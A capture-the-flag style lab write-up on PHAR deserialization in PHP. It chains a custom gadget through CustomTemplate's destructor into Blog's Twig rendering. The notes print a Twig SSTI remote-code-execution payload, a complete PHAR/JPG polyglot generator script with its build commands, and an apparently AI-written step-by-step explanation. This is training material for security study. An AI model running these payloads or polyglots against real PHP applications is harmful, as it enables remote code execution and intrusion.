# EXPERT: Using PHAR deserialization to deploy a custom gadget chain

![Снимок экрана 2025-12-03 в 14.55.31.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.55.31.png)

![Снимок экрана 2025-12-03 в 14.55.51.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.55.51.png)

![Снимок экрана 2025-12-03 в 15.04.20.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.04.20.png)

![Снимок экрана 2025-12-03 в 14.57.09.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.57.09.png)

In `CustomTemplate.php`, there is a class called `CustomTemplate`.

Also, there is a `__destruct()` magic method, which will be invoked when the PHP script is stopped or exited.

When this method is invoked, it'll delete a file from `CustomTemplate->lockFilePath()`, which is `templates/$CustomTemplate->template_file_path.lock`.

Moreover, the `isTemplateLocked()` method is using `file_exists()` method on `CustomTemplate->lockFilePath()` attribute.

```python
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

In `Blog.php`, it uses Twig template engine, and there is a class called `Blog`.

The `__wakeup()` magic method is interesting for us, as it'll automatically invoked during the deserialization process.

When the `__wakeup()` magic method is invoked, it'll create a new object from `Twig_Environment()`, and it's referring the `Blog->desc` attribute.

```python
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

Armed with above information, we can exploit SSTI (Server-Side Template Injection) and using PHAR stream to gain remote code execution!

- SSTI:

According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php), we can gain remote code execution via:

![image.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/image.png)

Now we have a SSTI payload, we can build a PHP payload:

```python
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;

$blog->user = 'any_user_you_want';
$blog->desc = '\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}';

$object->template_file_path = $blog;
```

Finally, we can create a PHAR payload.

According to [this GitHub repository](https://github.com/kunte0/phar-jpg-polyglot), we can create a PHAR JPG ploygot:

```python
┌[root♥siunam]-(/opt)-[2023.01.13|15:21:05]
└> git clone https://github.com/kunte0/phar-jpg-polyglot.git;cd phar-jpg-polyglot
```

```python
<?php

function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();
    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed 
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}

// pop exploit class
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;
$blog->user = 'any_user_you_want';
$blog->desc = '\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}';
$object->template_file_path = $blog;

// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';
$payload = $object;
$prefix = '';

var_dump(serialize($object));

// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));

/*
// config for gif
$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
$tempname = 'temp.phar'; // make it phar
$outfile = 'out.gif';

// make gif
file_put_contents($outfile, generate_base_phar($payload, $prefix));

*/
```

Generate a polyglot:

```python
┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2023.01.13|15:23:56]-[git://master ✗]
└> php -d phar.readonly=0 phar_jpg_polyglot.php
string(229) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:17:"any_user_you_want";s:4:"desc";s:106:"\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}";}}"
┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2023.01.13|15:23:58]-[git://master ✗]
└> ls -lah out.jpg     
-rw-r--r-- 1 root root 132K Jan 13 15:23 out.jpg
```

Upload and solve the lab

![Снимок экрана 2025-12-03 в 15.21.27.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.21.27.png)

![Снимок экрана 2025-12-03 в 15.22.03.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.22.03.png)

![Снимок экрана 2025-12-03 в 15.23.59.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.23.59.png)

![Снимок экрана 2025-12-03 в 15.23.46.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.23.46.png)

![Снимок экрана 2025-12-03 в 15.24.09.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.24.09.png)

---

### DeepSeek explaination

This is a detailed explanation of the exploit process you provided. Let's break it down step by step.

## **Overview**

The lab demonstrates a **PHAR deserialization attack** that combines multiple vulnerabilities to achieve Remote Code Execution (RCE). The goal is to delete a file (`morale.txt`) from Carlos's home directory.

## **Key Components**

### 1. **The Attack Chain**

```
PHAR deserialization → Custom gadget chain → SSTI → RCE

```

### 2. **Understanding the Pieces**

**A. PHAR Deserialization**

- **PHAR** (PHP Archive) files have a metadata section that can contain serialized PHP objects
- PHP's `phar://` wrapper can deserialize this metadata when accessing the file
- Even if the file has a `.jpg` extension, if it's a valid PHAR file internally, PHP will treat it as such when accessed via `phar://`

**B. The Vulnerable Code**

- **CustomTemplate.php**: Has a `__destruct()` method that calls `unlink()` (file deletion)
- **Blog.php**: Has a `__wakeup()` method that creates a Twig template environment with user-controlled input

**C. Server-Side Template Injection (SSTI)**

- The Blog class uses Twig template engine
- The `desc` property is passed directly to Twig without sanitization
- Twig has known exploits for RCE when user input is not properly filtered

## **Step-by-Step Exploit Process**

### **Step 1: Create the Malicious Object Chain**

```php
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;

$blog->user = 'any_user_you_want';
$blog->desc = '\\{\\{_self.env.registerUndefinedFilterCallback("exec")\\}\\}\\{\\{_self.env.getFilter("rm /home/carlos/morale.txt")\\}\\}';

$object->template_file_path = $blog;

```

**Why this works:**

1. When `CustomTemplate` is destroyed, its `__destruct()` method calls `unlink($this->lockFilePath())`
2. `lockFilePath()` returns `'templates/' . $this->template_file_path . '.lock'`
3. If `template_file_path` is a Blog object, PHP will try to convert it to string (via `__toString()`)
4. `Blog::__toString()` calls `$this->twig->render()`
5. But `$twig` is only set in `__wakeup()` during deserialization!
6. So we need to trigger deserialization first...

### **Step 2: The SSTI Payload**

The payload in `desc`:

```
\\{\\{_self.env.registerUndefinedFilterCallback("exec")\\}\\}\\{\\{_self.env.getFilter("rm /home/carlos/morale.txt")\\}\\}

```

- Registers a callback that uses `exec()` when an undefined filter is called
- Then calls that filter to execute `rm /home/carlos/morale.txt`

### **Step 3: Create PHAR/JPG Polyglot**

A **polyglot** file is one that's valid in multiple formats. Here, it's both:

- A valid JPG image (to pass upload checks)
- A valid PHAR archive (to trigger deserialization)

The script creates this by:

1. Creating a PHAR file with serialized object as metadata
2. Embedding the PHAR data into a JPG file at specific offsets
3. Preserving the JPG header so image validators accept it

### **Step 4: Trigger the Exploit**

1. Upload the polyglot file as an avatar (accepted as JPG)
2. Access it via: `/cgi-bin/avatar.php?avatar=phar://wiener`
    - `phar://` tells PHP to interpret the file as a PHAR archive
    - PHP reads the PHAR metadata and deserializes the object
    - This triggers the gadget chain

## **The Gadget Chain Flow**

```
1. phar:// access triggers PHAR metadata deserialization
2. CustomTemplate object is unserialized
3. Blog object inside is unserialized
4. Blog::__wakeup() is called (during deserialization)
5. Blog::__wakeup() creates Twig environment with desc (our SSTI payload)
6. Later, when script ends, CustomTemplate::__destruct() is called
7. It calls unlink(), which needs lockFilePath()
8. lockFilePath() concatenates "templates/" + template_file_path + ".lock"
9. template_file_path is a Blog object, so PHP calls Blog::__toString()
10. Blog::__toString() calls $twig->render()
11. Twig renders the template with our malicious desc
12. SSTI payload executes rm /home/carlos/morale.txt

```

## **Why This is Clever**

1. **Bypasses upload restrictions**: File looks like a valid JPG
2. **No direct deserialization in app**: The app doesn't directly deserialize user input, but PHAR does it automatically
3. **Chains multiple vulnerabilities**: PHAR + deserialization + SSTI
4. **Uses magic methods**: Leverages PHP's automatic method calls (`__wakeup`, `__destruct`, `__toString`)

## **Key Learning Points**

- **PHAR files can be polyglots** and bypass file type validation
- **Deserialization can happen indirectly** through file operations
- **Magic methods are dangerous** when combined with user input
- **Template engines need careful input validation** to prevent SSTI
- **Complex vulnerabilities often chain multiple smaller issues**

This exploit is sophisticated because it requires understanding multiple PHP features and how they can interact maliciously. The attacker essentially creates a "Rube Goldberg machine" of vulnerabilities where each step triggers the next.

![Снимок экрана 2025-12-03 в 15.39.30.png](EXPERT%20Using%20PHAR%20deserialization%20to%20deploy%20a%20cust/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_15.39.30.png)